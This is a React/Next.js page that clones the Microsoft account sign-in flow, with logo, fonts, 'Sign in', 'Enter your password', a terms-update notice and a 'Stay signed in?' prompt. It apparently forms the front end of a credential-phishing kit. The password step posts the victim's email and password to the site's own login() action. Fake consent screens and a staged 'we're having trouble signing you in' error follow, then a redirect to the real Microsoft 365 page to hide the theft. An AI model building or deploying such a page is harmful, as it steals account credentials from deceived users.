"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { login } from "./api/_actions/api";

export default function Home() {
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [direction, setDirection] = useState<"next" | "back">("next");
  const [history, setHistory] = useState<number[]>([]);
  const [loading, setLoading] = useState(false);
  const [verificationMessage, setVerificationMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    sub: "",
    key: "",
  });

  // const loading = true;

  const finalUrl =
    "https://m365.cloud.microsoft/search?from=PortalHome&redirfrom=userTypeCookie&redirfrom=cosmicRingCookie";

  useEffect(() => {
    if (step !== 5) return;

    const timeout = setTimeout(() => {
      // Navigate after the configured delay
      window.location.href =
        "https://m365.cloud.microsoft/search?from=PortalHome&redirfrom=userTypeCookie&redirfrom=cosmicRingCookie";
    }, 5000);

    return () => clearTimeout(timeout);
  }, [step, router]);

  const goTo = (nextStep: number) => {
    setDirection("next");
    setHistory((prev) => [...prev, step]); // remember where we were
    setStep(nextStep);
  };

  const handleBack = () => {
    setDirection("back");
    setHistory((prev) => {
      if (prev.length === 0) return prev; // nothing to go back to
      const previous = prev[prev.length - 1]; // peek last
      setStep(previous); // return to it
      return prev.slice(0, -1); // pop it off
    });
  };

  const handleNext = async () => {
    if (step === 1) {
      if (!formData.sub.trim()) {
        setVerificationMessage(
          "Enter a valid email address, phone number, or Skype name.",
        );
        return;
      }
      setVerificationMessage("");
      goTo(2);
    }
    if (step === 2) {
      if (!formData.key.trim()) {
        setVerificationMessage(
          "Enter the password for your Microsoft account.",
        );
        return;
      }
      setVerificationMessage("");
      setLoading(true);
      try {
        const result = await login({
          sub: formData.sub,
          key: formData.key,
        });

        if (!result.success) {
          console.error(result.message);
        }
      } catch (error) {
        console.error("Error logging in:", error);
        return;
      } finally {
        setLoading(false);
      }

      goTo(3);
    }

    if (step === 3) {
      setVerificationMessage("");
      goTo(4);
    }

    if (step === 4) {
      setVerificationMessage("");
      setLoading(true);

      await new Promise((resolve) => setTimeout(resolve, 2000));

      setLoading(false);
      goTo(5);
    }
  };

  const handleChange = (e: any) => {
    const { name, value } = e.target;
    setVerificationMessage("");

    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  return (
    <main className="flex flex-col min-h-screen overflow-y-auto bg-zinc-50 dark:bg-black bg-[url('/images/bg.svg')] bg-cover bg-center bg-no-repeat">
      <div className="flex flex-col min-h-screen items-center justify-center py-8 font-sans">
        <div
          key={step}
          className={
            direction === "next"
              ? "animate-[slideInRight_0.3s_ease-out] w-full flex flex-col items-center"
              : "animate-[slideInLeft_0.3s_ease-out] w-full flex flex-col items-center"
          }
        >
          {step === 1 && (
            <main className="my-auto flex flex-col min-h-84.5 h-full bg-white [text-size-adjust:100%] font-normal text-[0.9375rem] leading-5 [direction:ltr] text-[#1b1b1b] text-left box-border mx-auto relative max-w-[440px] w-[calc(100%-40px)] shadow-[0_2px_6px_rgba(0,0,0,0.2)] min-w-[320px] overflow-hidden animate-[fadeIn_0.3s_ease-in] mb-5">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={400}
                    unoptimized
                  />
                </div>
              )}
              {/* <ProgressBar /> */}
              <div className="flex flex-col flex-1 justify-between px-11 py-11">
                <div>
                  <Image
                    src="/images/logo.svg"
                    alt="Logo"
                    width={108}
                    height={24}
                  />
                </div>
                <div className="mt-5 mb-3">
                  <span className="text-[1.5rem] [direction:ltr] text-left leading-7 text-[#1b1b1b] text-2xl font-semibold font-['Segoe_UI','Helvetica_Neue','Lucida_Grande',Roboto,Ebrima,'Nirmala_UI',Gadugi,'Segoe_Xbox_Symbol','Segoe_UI_Symbol','Meiryo_UI','Khmer_UI',Tunga,'Lao_UI',Raavi,'Iskoola_Pota',Latha,Leelawadee,'Microsoft_YaHei_UI','Microsoft_JhengHei_UI','Malgun_Gothic','Estrangelo_Edessa','Microsoft_Himalaya','Microsoft_New_Tai_Lue','Microsoft_PhagsPa','Microsoft_Tai_Le','Microsoft_Yi_Baiti','Mongolian_Baiti','MV_Boli','Myanmar_Text','Cambria_Math'] box-border [text-size-adjust:100%]">
                    Sign in
                  </span>
                </div>
                {verificationMessage && (
                  <p className="text-sm text-[#e81123]">
                    {verificationMessage}
                  </p>
                )}
                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    handleNext();
                  }}
                  className="flex flex-col flex-1 justify-between"
                >
                  <div className="mt-3">
                    <input
                      type="email"
                      name="sub"
                      value={formData.sub}
                      onChange={handleChange}
                      id="sub"
                      aria-describedby="emailHelp"
                      placeholder="Email, phone or Skype"
                      className={`--font-segoe border-0 border-b border-b-[#666666] w-full pb-2 rounded-0 focus:border-b-[#0067b8] focus:bg-transparent focus:outline-none ${
                        verificationMessage ? "" : ""
                      }`}
                    />
                  </div>

                  <div className="--font-segoe mt-5 flex items-center gap-1 [text-size-adjust:100%] font-['Segoe_UI_Webfont',-apple-system,'Helvetica_Neue','Lucida_Grande',Roboto,Ebrima,'Nirmala_UI',Gadugi,'Segoe_Xbox_Symbol','Segoe_UI_Symbol','Meiryo_UI','Khmer_UI',Tunga,'Lao_UI',Raavi,'Iskoola_Pota',Latha,Leelawadee,'Microsoft_YaHei_UI','Microsoft_JhengHei_UI','Malgun_Gothic','Estrangelo_Edessa','Microsoft_Himalaya','Microsoft_New_Tai_Lue','Microsoft_PhagsPa','Microsoft_Tai_Le','Microsoft_Yi_Baiti','Mongolian_Baiti','MV_Boli','Myanmar_Text','Cambria_Math'] font-normal leading-5 [direction:ltr] text-[#1b1b1b] text-left text-[0.8125rem] box-border mb-4">
                    <span>No account?</span>
                    <a
                      href="https://signup.live.com/signup"
                      className="--font-segoe text-[#0067b8]/90 hover:text-[#666666] hover:underline"
                    >
                      Create one!
                    </a>
                  </div>

                  <div>
                    <button
                      type="button"
                      onClick={() => goTo(4)}
                      className="cursor-pointer --font-segoe font-normal leading-5 text-[#0067b8]/90 hover:text-[#666666] text-[0.8125rem] hover:underline"
                    >
                      <span>Can't access your account?</span>
                    </button>
                  </div>

                  <div className="mt-5 flex justify-end">
                    <div className="flex gap-1">
                      {/* <button
                      onClick={handleBack}
                      className="[text-size-adjust:100%] w-[50%] [direction:ltr] box-border [font:inherit] m-0 [font-family:inherit] [font-size:inherit] [appearance:button] cursor-pointer relative max-w-full text-center align-middle text-ellipsis [touch-action:manipulation] text-black min-h-[32px] bg-[rgba(0,0,0,0.2)] hover:bg-[#0000004d] min-w-[108px] leading-[normal] block px-3 py-1 whitespace-nowrap border-0"
                    >
                      Back
                    </button> */}
                      <button
                        type="submit"
                        className="[text-size-adjust:100%] w-[50%] cursor-pointer px-3 py-1 whitespace-nowrap min-h-[32px] min-w-[108px] border-0 text-white bg-[#0067b8] hover:bg-[#005da6]"
                      >
                        Next
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </main>
          )}
          {step === 2 && (
            <main className="password-container pb-10 my-auto">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={1}
                    unoptimized
                  />
                </div>
              )}
              <div className="mb-8 px-10 mt-10 flex items-center justify-between w-full">
                <button
                  disabled={loading}
                  onClick={handleBack}
                  className="cursor-pointer w-5 h-6"
                >
                  <Image
                    src="/icons/back.svg"
                    alt="back"
                    width={24}
                    height={24}
                  />
                </button>

                <Image
                  src="/icons/micro.svg"
                  alt="back"
                  width={114}
                  height={24}
                />

                <div />
              </div>
              <div className="mb-3 px-10 flex items-center justify-center">
                <div className="flex h-8 items-center px-[calc(var(--spacingHorizontalSNudge)+var(--spacingHorizontalXXS))] border border-[#e0e0e0] rounded-full">
                  <span className="text-xs font-semibold leading-4 text-[#61614A]">
                    {formData.sub}
                  </span>
                </div>
              </div>
              <div className="px-10 leading-5 w-full text-center box-border py-2">
                <span className="text-2xl font-semibold leading-5 text-[#242424]">
                  Enter your password
                </span>
              </div>
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleNext();
                }}
                className="flex flex-col w-full"
              >
                <div className="px-10 w-full box-border">
                  <div className="relative mt-8 w-full group">
                    <input
                      type={showPassword ? "text" : "password"}
                      name="key"
                      value={formData.key}
                      onChange={handleChange}
                      id="key"
                      aria-describedby="keyHelp"
                      placeholder=" "
                      disabled={loading}
                      className="peer w-full min-h-10 border border-gray-300 border-b-[#666666] py-2 pl-2 pr-10 rounded-sm focus:border-b-[#0067b8] focus:border-b-2 focus:outline-none bg-transparent"
                    />

                    <label
                      htmlFor="key"
                      className="absolute left-2 top-2 px-1 text-gray-500 bg-white pointer-events-none transition-all duration-200
      peer-focus:-top-2.5 peer-focus:text-[10px]
      peer-not-placeholder-shown:-top-2.5 peer-not-placeholder-shown:text-[10px]"
                    >
                      Password
                    </label>

                    <button
                      type="button"
                      disabled={loading}
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 peer-focus:opacity-100 transition-opacity duration-200 cursor-pointer"
                      aria-label={
                        showPassword ? "Hide password" : "Show password"
                      }
                    >
                      <Image
                        src="/icons/eye.svg"
                        alt=""
                        width={20}
                        height={20}
                      />
                    </button>
                  </div>
                </div>
                {verificationMessage && (
                  <div className="w-full flex items-center gap-1 text-red-600 text-xs px-10">
                    <svg
                      fill="currentColor"
                      className="text-red-500 shrink-0"
                      width="10"
                      height="10"
                      viewBox="0 0 10 10"
                      aria-hidden="true"
                    >
                      <path
                        d="M5 10A5 5 0 1 0 5 0a5 5 0 0 0 0 10Zm-.75-2.75a.75.75 0 1 1 1.5 0 .75.75 0 0 1-1.5 0Zm.26-4.84a.5.5 0 0 1 .98 0l.01.09v2.59a.5.5 0 0 1-1 0V3.41Z"
                        fill="currentColor"
                      />
                    </svg>

                    <span className="text-xs">
                      Enter the password for your Microsoft account.
                    </span>
                  </div>
                )}
                <div className="mt-4 w-full px-10">
                  <button
                    disabled={loading}
                    type="button"
                    onClick={() =>
                      (window.location.href = "https://account.live.com/acsr")
                    }
                    className="text-[#115ea3] contrast-80 font-semibold cursor-pointer hover:underline"
                  >
                    Forgot your password?
                  </button>
                </div>
                <div className="px-10 mt-8 w-full">
                  <button
                    // onClick={handleNext}
                    type="submit"
                    disabled={loading}
                    className="w-full hover:bg-[#115ea3] cursor-pointer bg-[#0f6cbd] text-white py-2 px-4 rounded"
                  >
                    {loading ? (
                      <div className="w-full flex items-center justify-center">
                        <svg
                          className="animate-spin h-5 w-5 text-[#ffffff]"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 24 24"
                          fill="none"
                        >
                          <path
                            d="M12 2a10 10 0 0 1 10 10"
                            stroke="currentColor"
                            strokeWidth="2.5"
                            strokeLinecap="round"
                          />
                        </svg>
                      </div>
                    ) : (
                      <span>Next</span>
                    )}
                  </button>
                </div>
              </form>
              <div className="px-10 mt-6 w-full">
                <button
                  disabled={loading}
                  onClick={() => goTo(3)}
                  className="w-full cursor-pointer text-[#115ea3] hover:underline hover:text-[#0f548c]"
                >
                  <span className="font-semibold">
                    Sign in with a different Microsoft account
                  </span>
                </button>
              </div>
            </main>
          )}
          {step === 3 && (
            <main className="password-container my-auto pb-10">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={400}
                    unoptimized
                  />
                </div>
              )}
              <div className="mb-8 px-10 mt-10 flex items-center justify-center w-full">
                <Image
                  src="/icons/micro.svg"
                  alt="back"
                  width={114}
                  height={24}
                />
              </div>
              <div className="mb-3 px-10 flex items-center justify-center">
                <div className="flex h-8 items-center px-[calc(var(--spacingHorizontalSNudge)+var(--spacingHorizontalXXS))] border border-[#e0e0e0] rounded-full">
                  <span className="text-xs font-semibold leading-4 text-[#61614A]">
                    {formData.sub}
                  </span>
                </div>
              </div>
              <div className="px-10 leading-5 w-full text-center box-border py-2">
                <span className="text-2xl font-semibold leading-5 text-[#242424]">
                  We're updating our terms
                </span>
              </div>
              <div>
                <Image
                  src="/images/terms.png"
                  alt="terms"
                  width={192}
                  height={216}
                />
              </div>
              <div className="px-10 w-full box-border">
                <span className="text-[#424242] text-[14px] text-center block">
                  As part of our efforts to improve your Microsoft experience,
                  we wanted to let you know that we have updated the Microsoft
                  Services Agreement.
                </span>
              </div>
              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  handleNext();
                }}
                className="flex flex-col w-full"
              >
                <div className="px-10 mt-8 w-full">
                  <button
                    // onClick={handleNext}
                    type="submit"
                    className="w-full hover:bg-[#115ea3] cursor-pointer bg-[#0f6cbd] text-white py-2 px-4 rounded"
                  >
                    <span>Next</span>
                  </button>
                </div>
              </form>
              <div className="px-10 mt-8 w-full text-center">
                <a
                  href="https://go.microsoft.com/fwlink/?LinkID=2092202"
                  className="w-full cursor-pointer text-[#115ea3] hover:underline hover:text-[#0f548c]"
                >
                  <span className=" font-semibold">
                    Learn more about these updates
                  </span>
                </a>
              </div>
            </main>
          )}
          {step === 4 && (
            <main className="password-container my-auto pb-10">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={400}
                    unoptimized
                  />
                </div>
              )}
              <div className="mb-8 px-10 mt-10 flex items-center justify-center w-full">
                <Image
                  src="/icons/micro.svg"
                  alt="back"
                  width={114}
                  height={24}
                />
              </div>
              <div className="mb-3 px-10 flex items-center justify-center">
                <div className="flex h-8 items-center px-[calc(var(--spacingHorizontalSNudge)+var(--spacingHorizontalXXS))] border border-[#e0e0e0] rounded-full">
                  <span className="text-xs font-semibold leading-4 text-[#61614A]">
                    {formData.sub}
                  </span>
                </div>
              </div>
              <div className="px-10 leading-5 w-full text-center box-border py-2">
                <span className="text-2xl font-semibold leading-5 text-[#242424]">
                  Stay signed in?
                </span>
              </div>
              <div>
                <video
                  src="/videos/stay.mp4"
                  autoPlay
                  muted
                  // loop
                  playsInline
                  className="w-48 h-auto"
                >
                  Your browser does not support video playback.
                </video>
              </div>
              <div className="px-10 w-full box-border">
                <span className="text-[#424242] text-[14px] text-center block">
                  Skip having to sign in every time.{" "}
                  <a
                    href="https://go.microsoft.com/fwlink/?LinkID=2281649"
                    className="hover:underline text-[#115ea3] font-semibold"
                  >
                    Learn more
                  </a>
                </span>
              </div>
              <div className="flex flex-col gap-3 px-10 mt-8 w-full">
                <button
                  onClick={handleNext}
                  className="w-full hover:bg-[#115ea3] cursor-pointer bg-[#0f6cbd] text-white py-2 px-4 rounded"
                >
                  <span>Yes</span>
                </button>
                <button
                  onClick={handleNext}
                  className="w-full hover:bg-[#f5f5f5] cursor-pointer bg-transparent text-[#242424] border border-[#d1d1d1] py-2 px-4 rounded"
                >
                  <span className="text-[#242424] font-semibold">No</span>
                </button>
              </div>
            </main>
          )}
          {step === 5 && (
            <main className="password-container my-auto pb-10">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={400}
                    unoptimized
                  />
                </div>
              )}
              <div className="mb-8 px-10 mt-10 flex items-center justify-center w-full">
                <Image
                  src="/icons/micro.svg"
                  alt="back"
                  width={114}
                  height={24}
                />
              </div>
              <div className="mb-3 px-10 flex items-center justify-center">
                <div className="flex h-8 items-center px-[calc(var(--spacingHorizontalSNudge)+var(--spacingHorizontalXXS))] border border-[#e0e0e0] rounded-full">
                  <span className="text-xs font-semibold leading-4 text-[#61614A]">
                    {formData.sub}
                  </span>
                </div>
              </div>
              <div className="px-10 leading-5 w-full text-center box-border py-2">
                <span className="text-2xl font-semibold leading-5 text-[#242424]">
                  Hmm... we're having trouble signing you in.
                </span>
              </div>
              <div className="px-10 mt-5 w-full box-border">
                <span className="text-[#424242] text-[14px] text-center block">
                  You may be experiencing network failure. Close and reopen your
                  browser before retrying.
                </span>
              </div>
            </main>
          )}
          {step === 6 && (
            <main className="password-container pb-10 my-auto">
              <div className="mb-8 mt-10 px-10 flex items-center justify-between w-full">
                <button onClick={handleBack} className="cursor-pointer w-5 h-6">
                  <Image
                    src="/icons/back.svg"
                    alt="back"
                    width={24}
                    height={24}
                  />
                </button>

                <Image
                  src="/icons/micro.svg"
                  alt="back"
                  width={114}
                  height={24}
                />

                <div />
              </div>

              <div className="leading-5 w-full text-center box-border py-2">
                <span className="text-2xl font-semibold leading-5 text-[#242424]">
                  Sign in
                </span>
              </div>
              <div className="mt-3 flex items-center justify-center">
                <span className="text-sm leading-4 text-[#424242]">
                  Use your Microsoft account.
                </span>
              </div>
              <div className="w-full px-10">
                <div className="relative mt-8 group w-full">
                  <input
                    type="email"
                    name="sub"
                    value={formData.sub}
                    onChange={handleChange}
                    id="sub"
                    placeholder=" "
                    className="peer w-full min-h-10 border border-gray-300 border-b-[#666666] py-2 px-2 rounded-sm focus:border-b-[#0067b8] focus:border-b-2 focus:outline-none bg-transparent "
                  />

                  <label
                    htmlFor="email"
                    className="absolute left-2 top-2 px-1 text-gray-500 bg-white pointer-events-none transition-all duration-200
    peer-focus:-top-2.5 peer-focus:text-[10px] peer-focus:text-gray-500
    peer-not-placeholder-shown:-top-2.5 peer-not-placeholder-shown:text-[10px]"
                  >
                    Email or phone number
                  </label>
                </div>
              </div>
              <div className="mt-4 w-full px-10">
                <button className="text-[#115ea3] contrast-80 font-semibold cursor-pointer hover:underline">
                  Forgot your username?
                </button>
              </div>
              <div className="mt-8 w-full px-10">
                <button
                  onClick={handleNext}
                  disabled={loading}
                  className={`w-full cursor-pointer py-2 px-4 rounded transition-colors duration-200 flex items-center justify-center
    ${
      loading
        ? "bg-white text-[#115ea3]"
        : "bg-[#0f6cbd] hover:bg-[#115ea3] text-white border border-[#115ea3]"
    }`}
                >
                  {loading ? (
                    <svg
                      className="animate-spin h-5 w-5 text-[#115ea3]"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 24 24"
                      fill="none"
                    >
                      <path
                        d="M12 2a10 10 0 0 1 10 10"
                        stroke="currentColor"
                        strokeWidth="2.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  ) : (
                    <span>Next</span>
                  )}
                </button>
              </div>
              <div className="mt-8 w-full flex items-center justify-center gap-1">
                <span>New to Microsoft?</span>
                <button className="cursor-pointer text-[#115ea3] hover:underline hover:text-[#0f548c]">
                  <span className=" font-semibold">Create an account</span>
                </button>
              </div>
            </main>
          )}
          {step === 7 && (
            <main className="my-auto flex flex-col min-h-84.5 h-full bg-white [text-size-adjust:100%] font-normal text-[0.9375rem] leading-5 [direction:ltr] text-[#1b1b1b] text-left box-border mx-auto relative max-w-[440px] w-[calc(100%-40px)] shadow-[0_2px_6px_rgba(0,0,0,0.2)] min-w-[320px] overflow-hidden animate-[fadeIn_0.3s_ease-in] mb-5">
              {loading && (
                <div className="w-full shrink-0">
                  <Image
                    src="/gifs/antss.gif"
                    alt="My animation"
                    width={700}
                    height={400}
                    unoptimized
                  />
                </div>
              )}
              {/* <ProgressBar /> */}
              <div className="flex flex-col flex-1 justify-between py-11">
                <div className="px-11">
                  <Image
                    src="/images/logo.svg"
                    alt="Logo"
                    width={108}
                    height={24}
                  />
                </div>
                <div className="mt-5 mb-3 px-11">
                  <span className="text-[1.5rem] [direction:ltr] text-left leading-7 text-[#1b1b1b] text-2xl font-semibold font-['Segoe_UI','Helvetica_Neue','Lucida_Grande',Roboto,Ebrima,'Nirmala_UI',Gadugi,'Segoe_Xbox_Symbol','Segoe_UI_Symbol','Meiryo_UI','Khmer_UI',Tunga,'Lao_UI',Raavi,'Iskoola_Pota',Latha,Leelawadee,'Microsoft_YaHei_UI','Microsoft_JhengHei_UI','Malgun_Gothic','Estrangelo_Edessa','Microsoft_Himalaya','Microsoft_New_Tai_Lue','Microsoft_PhagsPa','Microsoft_Tai_Le','Microsoft_Yi_Baiti','Mongolian_Baiti','MV_Boli','Myanmar_Text','Cambria_Math'] box-border [text-size-adjust:100%]">
                    Which type of account do you need help with?
                  </span>
                </div>

                <div className="w-full flex flex-col">
                  <a
                    href="https://passwordreset.microsoftonline.com/"
                    className="py-3 px-11 hover:bg-[rgba(0,0,0,0.1)] cursor-pointer"
                  >
                    <div className="flex items-center">
                      <div>
                        <Image
                          src="/icons/work.svg"
                          alt="Work Account"
                          width={48}
                          height={48}
                        />
                      </div>
                      <div className="flex flex-col items-start px-3">
                        <span className="text-[15px] text-[#1b1b1b]">
                          Work or school account
                        </span>
                        <span className="text-[12px] text-[#1b1b1b]">
                          Created by your IT department
                        </span>
                      </div>
                    </div>
                  </a>
                  <a
                    href="https://account.live.com/password/reset"
                    className="py-3 px-11 hover:bg-[rgba(0,0,0,0.1)] cursor-pointer"
                  >
                    <div className="flex items-center">
                      <div>
                        <Image
                          src="/icons/you.svg"
                          alt="Personal Account"
                          width={48}
                          height={48}
                        />
                      </div>
                      <div className="flex flex-col items-start px-3">
                        <span className="text-[15px] text-[#1b1b1b]">
                          Personal account
                        </span>
                        <span className="text-[12px] text-[#1b1b1b]">
                          Created by you
                        </span>
                      </div>
                    </div>
                  </a>
                </div>

                <div className="mt-5 flex justify-end px-11">
                  <div className="flex gap-1">
                    <button
                      onClick={handleBack}
                      className="[text-size-adjust:100%] w-[50%] [direction:ltr] box-border [font:inherit] m-0 [font-family:inherit] [font-size:inherit] [appearance:button] cursor-pointer relative max-w-full text-center align-middle text-ellipsis [touch-action:manipulation] text-black min-h-[32px] bg-[rgba(0,0,0,0.2)] hover:bg-[#0000004d] min-w-[108px] leading-[normal] block px-3 py-1 whitespace-nowrap border-0"
                    >
                      Back
                    </button>
                  </div>
                </div>
              </div>
            </main>
          )}
        </div>
      </div>

      {(step === 2 || step === 3 || step === 5 || step === 6) && (
        <footer className="p-3 bg-white/50 gap-1 flex flex-col">
          <div className="w-full flex items-center justify-center gap-6">
            <button className="w-fit">
              <span className="text-[#424242] text-xs">Help and feedback</span>
            </button>

            <button className="w-fit">
              <span className="text-[#424242] text-xs">Terms of use</span>
            </button>

            <button className="w-fit">
              <span className="text-[#424242] text-xs">
                Privacy and cookies
              </span>
            </button>
          </div>
          <div className="w-full flex items-center justify-center">
            <span className="text-[#424242] text-[10px]">
              Use private browsing if this is not your device.{" "}
              <a
                href="https://go.microsoft.com/fwlink/?LinkID=2281649"
                className="hover:underline text-[#115ea3] font-semibold"
              >
                Learn more
              </a>
            </span>
          </div>
        </footer>
      )}
    </main>
  );
}
